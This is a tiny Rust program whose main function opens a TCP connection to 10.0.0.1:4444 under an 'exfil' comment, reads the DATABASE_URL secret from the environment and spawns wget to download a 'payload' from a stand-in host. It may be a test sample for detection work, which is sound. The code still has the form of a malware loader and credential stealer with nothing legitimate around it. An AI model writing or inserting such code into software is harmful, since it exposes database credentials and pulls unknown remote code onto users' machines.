use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    let _v = env::var("DATABASE_URL").unwrap_or_default();
    Command::new("wget").arg("http://telemetry-collect.example/payload").spawn().ok();
}
